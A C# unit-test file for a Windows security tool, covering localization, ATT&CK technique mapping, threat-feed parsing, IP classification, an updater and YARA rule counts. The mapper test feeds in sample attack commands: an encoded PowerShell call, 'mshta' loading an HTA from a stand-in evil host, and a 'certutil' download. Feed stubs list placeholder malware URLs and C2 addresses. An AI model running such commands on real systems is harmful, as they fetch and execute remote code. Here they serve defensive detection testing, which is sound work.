using System.Net;
using System.Text;
using Becetti.Security.Core.Models;
using Becetti.Security.Core.Services;

namespace Becetti.Security.Core.Tests;

public sealed class GlobalWaveFeaturesTests : IDisposable
{
    private readonly string _tempDir;

    public GlobalWaveFeaturesTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), "becetti-global-tests-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, recursive: true);
        }
        catch { }
    }

    // -------------------------------------------------------------------------
    //  #5: 6 Global Languages Embedded Catalog & Live Parity
    // -------------------------------------------------------------------------
    [Fact]
    public async Task Localization_AllSixGlobalLanguages_HaveFullKeyParityAndLiveSwitch()
    {
        var settings = new SettingsService(_tempDir);
        var loc = new LocalizationService(settings);

        var enKeys = loc.GetKeys(AppLanguage.English);
        Assert.True(enKeys.Count >= 400, $"Expected >= 400 keys, got {enKeys.Count}");

        foreach (var lang in new[]
        {
            AppLanguage.Arabic,
            AppLanguage.French,
            AppLanguage.Spanish,
            AppLanguage.German,
            AppLanguage.Turkish
        })
        {
            var keys = loc.GetKeys(lang);
            Assert.Equal(enKeys.Count, keys.Count);
        }

        await loc.SetLanguageAsync(AppLanguage.Spanish);
        Assert.Equal("es-ES", loc.Bcp47Tag);
        Assert.False(loc.IsRtl);
        Assert.Equal("Configuración", loc.Get("TitleSettings.Text"));

        await loc.SetLanguageAsync(AppLanguage.German);
        Assert.Equal("de-DE", loc.Bcp47Tag);
        Assert.Equal("Einstellungen", loc.Get("TitleSettings.Text"));

        await loc.SetLanguageAsync(AppLanguage.Turkish);
        Assert.Equal("tr-TR", loc.Bcp47Tag);
        Assert.Equal("Ayarlar", loc.Get("TitleSettings.Text"));
    }

    // -------------------------------------------------------------------------
    //  #1: MITRE ATT&CK Enterprise Framework Mapper & Computed Badges
    // -------------------------------------------------------------------------
    [Fact]
    public void MitreAttackMapper_CoversCatalogAndMapsAllFindingCategories()
    {
        var catalog = MitreAttackMapper.GetAllMappedTechniques();
        Assert.True(catalog.Count >= 20);
        Assert.All(catalog, t =>
        {
            Assert.StartsWith("T", t.TechniqueId);
            Assert.False(string.IsNullOrWhiteSpace(t.TechniqueName));
            Assert.False(string.IsNullOrWhiteSpace(t.Tactic));
            Assert.StartsWith("https://attack.mitre.org/techniques/", t.Url);
        });

        Assert.Equal("T1547.001", MitreAttackMapper.MapPersistenceCategory("HKCU Run Key").TechniqueId);
        Assert.Equal("T1053.005", MitreAttackMapper.MapPersistenceCategory("Scheduled Task").TechniqueId);
        Assert.Equal("T1543.003", MitreAttackMapper.MapPersistenceCategory("Windows Service").TechniqueId);
        Assert.Equal("T1547.004", MitreAttackMapper.MapPersistenceCategory("Winlogon Helper").TechniqueId);
        Assert.Equal("T1546.012", MitreAttackMapper.MapPersistenceCategory("IFEO Debugger").TechniqueId);

        Assert.Equal("T1059.001", MitreAttackMapper.MapScriptCommand("powershell -enc SQBFAFgA").TechniqueId);
        Assert.Equal("T1218.005", MitreAttackMapper.MapScriptCommand("mshta http://evil.test/a.hta").TechniqueId);
        Assert.Equal("T1105", MitreAttackMapper.MapScriptCommand("certutil -urlcache -f http://a/b").TechniqueId);
        Assert.Equal("T1574.002", MitreAttackMapper.MapDllFinding("Loaded from temp user-writable folder").TechniqueId);
        Assert.Equal("T1055.001", MitreAttackMapper.MapDllFinding("Unsigned injected DLL").TechniqueId);

        var p = new PersistenceEntry { Category = "Scheduled Task" };
        Assert.Equal("T1053.005", p.MitreTechniqueId);

        var s = new SuspiciousScriptEvent { ProcessOrHost = "powershell.exe", RawCommand = "powershell -enc AAA" };
        Assert.Equal("T1059.001", s.MitreTechniqueId);

        var d = new ProcessDllInfo { RiskReason = "Unsigned module in temp directory" };
        Assert.Equal("T1574.002", d.MitreTechniqueId);
    }

    // -------------------------------------------------------------------------
    //  #2: Global Open Threat Intelligence Feeds (abuse.ch)
    // -------------------------------------------------------------------------
    [Fact]
    public async Task ThreatFeedService_SyncsFeedsAndMatchesIpDomainAndHash()
    {
        var handler = new StubHttpHandler(req =>
        {
            var url = req.RequestUri?.ToString() ?? "";
            if (url.Contains("feodotracker"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# Feodo comment\n198.51.100.42\n203.0.113.77\n", Encoding.UTF8)
                };
            if (url.Contains("urlhaus"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# URLhaus\nhttps://malware-drop.example.org/payload.exe\nhttp://evil-c2.test:8080/a\n", Encoding.UTF8)
                };
            if (url.Contains("bazaar"))
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    Content = new StringContent("# Bazaar\n" + new string('a', 64) + "\n", Encoding.UTF8)
                };
            return new HttpResponseMessage(HttpStatusCode.NotFound);
        });

        using var http = new HttpClient(handler);
        var settings = new SettingsService(_tempDir);
        var svc = new ThreatFeedService(http, settings);

        var res = await svc.SyncFeedsAsync();
        Assert.True(res.Success);
        Assert.NotNull(res.Value);
        Assert.Equal(2, res.Value!.BotnetC2IpCount);
        Assert.Equal(2, res.Value.MaliciousDomainCount);
        Assert.Equal(1, res.Value.MalwareSha256Count);

        var ipHit = svc.CheckIp("198.51.100.42");
        Assert.NotNull(ipHit);
        Assert.Equal("T1071", ipHit!.Mitre.TechniqueId);

        var domHit = svc.CheckDomainOrUrl("https://malware-drop.example.org/test");
        Assert.NotNull(domHit);
        Assert.Equal("T1105", domHit!.Mitre.TechniqueId);

        var hashHit = svc.CheckSha256(new string('A', 64));
        Assert.NotNull(hashHit);
        Assert.Equal("T1204.002", hashHit!.Mitre.TechniqueId);

        Assert.Null(svc.CheckIp("8.8.8.8"));
    }

    // -------------------------------------------------------------------------
    //  #3: Live Outbound GeoIP Radar Public/Private Classifier
    // -------------------------------------------------------------------------
    [Fact]
    public void OutboundRadarService_ClassifiesPrivateAndPublicIpsCorrectly()
    {
        Assert.False(OutboundRadarService.IsPublicIp("127.0.0.1"));
        Assert.False(OutboundRadarService.IsPublicIp("10.0.0.5"));
        Assert.False(OutboundRadarService.IsPublicIp("192.168.1.20"));
        Assert.False(OutboundRadarService.IsPublicIp("172.16.4.2"));
        Assert.False(OutboundRadarService.IsPublicIp("::1"));

        Assert.True(OutboundRadarService.IsPublicIp("1.1.1.1"));
        Assert.True(OutboundRadarService.IsPublicIp("8.8.8.8"));
        Assert.True(OutboundRadarService.IsPublicIp("198.51.100.42"));
    }

    // -------------------------------------------------------------------------
    //  #6: GitHub Releases Auto-Updater
    // -------------------------------------------------------------------------
    [Fact]
    public async Task AppUpdaterService_DetectsNewerGitHubReleaseAndMsixAsset()
    {
        const string json =
            "[{" +
            "\"tag_name\":\"v2.5.0\"," +
            "\"name\":\"BECETTI SECURITY v2.5.0 Global Edition\"," +
            "\"html_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/tag/v2.5.0\"," +
            "\"body\":\"Added MITRE ATT&CK, abuse.ch feeds, and 6 languages.\"," +
            "\"published_at\":\"2026-11-22T20:00:00Z\"," +
            "\"assets\":[{" +
            "\"name\":\"BECETTI-SECURITY_2.5.0.0_x64.msix\"," +
            "\"browser_download_url\":\"https://github.com/Ahmedbecett/BECETTI-SECURITY/releases/download/v2.5.0/BECETTI-SECURITY_2.5.0.0_x64.msix\"" +
            "}]" +
            "}]";

        var handler = new StubHttpHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StringContent(json, Encoding.UTF8, "application/json")
        });

        using var http = new HttpClient(handler);
        var updater = new AppUpdaterService(http);

        var check = await updater.CheckLatestGitHubReleaseAsync();
        Assert.True(check.Success);
        Assert.NotNull(check.Value);
        Assert.True(check.Value!.IsUpdateAvailable);
        Assert.Equal("2.5.0.0", check.Value.LatestVersion);
        Assert.EndsWith(".msix", check.Value.MsixDownloadUrl);
        Assert.Equal("BECETTI-SECURITY_2.5.0.0_x64.msix", check.Value.MsixFileName);
    }

    // Regression: the real GitHub API does NOT return /releases sorted by version (every CI
    // build shares one created_at, and all are published with --latest=false). Taking the
    // first entry in the JSON made the updater compare against 1.0.0.63 while 1.0.0.97 was
    // already published, so it told users on older builds they were up to date - and the
    // official website linked to the old download. The newest MSIX must win regardless of
    // the order the API returns them in.
    [Fact]
    public async Task AppUpdaterService_PicksHighestVersionWhenGitHubListIsOutOfOrder()
    {
        // Same shape as the real API: the newest build is neither first nor last.
        const string json = """
        [
          { "tag_name": "msix-test-fb6a9fe", "html_url": "https://github.com/x/releases/tag/fb6a9fe",
            "body": "older build", "published_at": "2026-11-22T16:45:49Z", "draft": false,
            "assets": [ { "name": "BECETTI-SECURITY_1.0.0.63_x64.msix",
                          "browser_download_url": "https://github.com/x/download/fb6a9fe/BECETTI-SECURITY_1.0.0.63_x64.msix" } ] },
          { "tag_name": "msix-test-d3f5201", "html_url": "https://github.com/x/releases/tag/d3f5201",
            "body": "newest build", "published_at": "2026-11-23T01:17:03Z", "draft": false,
            "assets": [ { "name": "BECETTI-SECURITY_1.0.0.97_x64.msix",
                          "browser_download_url": "https://github.com/x/download/d3f5201/BECETTI-SECURITY_1.0.0.97_x64.msix" } ] },
          { "tag_name": "msix-test-d08aa56", "html_url": "https://github.com/x/releases/tag/d08aa56",
            "body": "middle build", "published_at": "2026-11-23T00:43:57Z", "draft": false,
            "assets": [ { "name": "BECETTI-SECURITY_1.0.0.94_x64.msix",
                          "browser_download_url": "https://github.com/x/download/d08aa56/BECETTI-SECURITY_1.0.0.94_x64.msix" } ] }
        ]
        """;

        var handler = new StubHttpHandler(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StringContent(json, Encoding.UTF8, "application/json")
        });

        using var http = new HttpClient(handler);
        var updater = new AppUpdaterService(http);

        var info = AppUpdaterService.ParseLatestReleaseJson(json, "1.0.0.63");
        Assert.NotNull(info);
        Assert.Equal("1.0.0.97", info!.LatestVersion);
        Assert.Equal("msix-test-d3f5201", info.LatestTag);
        Assert.Equal("BECETTI-SECURITY_1.0.0.97_x64.msix", info.MsixFileName);
        Assert.Contains("d3f5201", info.MsixDownloadUrl);
        Assert.True(info.IsUpdateAvailable);

        // Someone already on the newest build must not be offered anything.
        var newest = AppUpdaterService.ParseLatestReleaseJson(json, "1.0.0.97");
        Assert.NotNull(newest);
        Assert.False(newest!.IsUpdateAvailable);

        // And a draft newer build must be ignored entirely.
        var draftJson = json.Replace(
            "\"published_at\": \"2026-11-23T01:17:03Z\", \"draft\": false",
            "\"published_at\": \"2026-11-23T01:17:03Z\", \"draft\": true");
        Assert.Contains("\"draft\": true", draftJson);
        var withoutDraft = AppUpdaterService.ParseLatestReleaseJson(draftJson, "1.0.0.63");
        Assert.NotNull(withoutDraft);
        Assert.Equal("1.0.0.94", withoutDraft!.LatestVersion);

        var live = await updater.CheckLatestGitHubReleaseAsync();
        Assert.True(live.Success);
        Assert.Equal("1.0.0.97", live.Value!.LatestVersion);
    }

    // Store policy 10.2.5: a product available in the Microsoft Store must be
    // installed and updated only through the Store. A packaged build must
    // therefore never be handed a direct GitHub .msix URL from the update
    // service. The unit-test host is an unpackaged process, so IsPackagedBuild()
    // must report false here and the GitHub URL must still be populated for the
    // standalone build - the mirrored condition guards against a regression that
    // would blank the URL for standalone users (or, worse, ship a direct
    // download link inside the Store package).
    [Fact]
    public void AppUpdaterService_StandaloneBuildKeepsDirectMsixUrl_AndGateIsWired()
    {
        Assert.False(AppUpdaterService.IsPackagedBuild(),
            "The test host is not an MSIX-packaged process; IsPackagedBuild must report false.");

        const string json = """
        [
          { "tag_name": "msix-test-standalone", "html_url": "https://github.com/x/releases/tag/a",
            "body": "notes", "published_at": "2026-11-23T01:17:03Z", "draft": false,
            "assets": [ { "name": "BECETTI-SECURITY_1.0.0.99_x64.msix",
                          "browser_download_url": "https://github.com/x/download/a/BECETTI-SECURITY_1.0.0.99_x64.msix" } ] }
        ]
        """;

        var info = AppUpdaterService.ParseLatestReleaseJson(json, "1.0.0.50");
        Assert.NotNull(info);
        // Unpackaged build: the URL is present (the gate in ParseLatestReleaseJson
        // is IsPackagedBuild() ? empty : url, evaluated in this process).
        Assert.Equal("https://github.com/x/download/a/BECETTI-SECURITY_1.0.0.99_x64.msix", info!.MsixDownloadUrl);
        Assert.Equal("BECETTI-SECURITY_1.0.0.99_x64.msix", info.MsixFileName);
    }

    // -------------------------------------------------------------------------
    //  #8: Windows Privacy & Anti-Telemetry Hardener
    // -------------------------------------------------------------------------
    [Fact]
    public async Task WindowsPrivacyHardenerService_HandlesAuditCleanlyAcrossPlatforms()
    {
        var svc = new WindowsPrivacyHardenerService();
        var audit = await svc.AuditPrivacyControlsAsync();
        if (OperatingSystem.IsWindows())
        {
            Assert.True(audit.Success);
            Assert.NotNull(audit.Value);
            Assert.Equal(6, audit.Value!.TotalCount);
            Assert.Equal(6, audit.Value.Controls.Count);
        }
        else
        {
            Assert.False(audit.Success);
        }
    }

    // -------------------------------------------------------------------------
    //  Expanded 43-Rule Built-In Native YARA Rule Suite Verification
    // -------------------------------------------------------------------------
    [Fact]
    public void BuiltInYaraRulesSuite_ContainsAllTenExpandedPacksAndFortyPlusRules()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        string? rulesDir = null;
        while (dir is not null)
        {
            var candidate = Path.Combine(dir.FullName, "src", "Becetti.Security.App", "Rules", "yara");
            if (Directory.Exists(candidate))
            {
                rulesDir = candidate;
                break;
            }
            dir = dir.Parent;
        }

        Assert.NotNull(rulesDir);
        var files = Directory.GetFiles(rulesDir!, "*.yar");
        Assert.True(files.Length >= 10, $"Expected >= 10 YARA rule packs, found {files.Length}");

        var ruleCount = 0;
        foreach (var f in files)
        {
            var lines = File.ReadAllLines(f);
            ruleCount += lines.Count(l => l.TrimStart().StartsWith("rule ", StringComparison.Ordinal));
        }

        Assert.True(ruleCount >= 40, $"Expected >= 40 built-in YARA rules, found {ruleCount}");
    }

    private sealed class StubHttpHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _factory;
        public StubHttpHandler(Func<HttpRequestMessage, HttpResponseMessage> factory) => _factory = factory;

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
            => Task.FromResult(_factory(request));
    }
}
